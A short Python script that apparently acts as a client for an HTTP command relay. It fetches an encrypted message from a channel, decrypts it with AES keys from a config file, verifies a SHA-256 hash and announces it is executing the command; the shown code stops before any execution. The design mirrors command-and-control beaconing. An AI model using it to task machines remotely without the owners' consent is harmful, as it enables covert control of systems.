from web.CmdRelay import HTTPCommandRelayClient
from utils.utils import load_config
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib
import base64

# Create the argument parser
parser = argparse.ArgumentParser(description='Command Line Arguments')
parser.add_argument('--url', type=str, help='URL argument')
parser.add_argument('--config', type=str, help='Config file to load')
parser.add_argument('--channel', type=str, help='Command to specific channel')

# Parse the command line arguments
args = parser.parse_args()

# Access the parsed arguments
url = args.url

_, _, _, _, enc_keys = load_config(args.config)

# Use the parsed arguments in your code
client = HTTPCommandRelayClient(url)

res = client.get_channel(args.channel)
print(res)

key_index, payload = res.split(':')  # Splitting res into key index and payload

key = enc_keys[int(key_index)].key
iv = enc_keys[int(key_index)].vector

decoded_data = base64.b64decode(payload)

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_cmd = cipher.decrypt(decoded_data)
unpadded_cmd = unpad(decrypted_cmd, AES.block_size)

hashed_cmd = unpadded_cmd[:32]
cmd = unpadded_cmd[32:].decode('utf-8')

if hashed_cmd == hashlib.sha256(cmd.encode()).digest():
    print("Hashes match")
    print("Executing command: " + cmd)
    
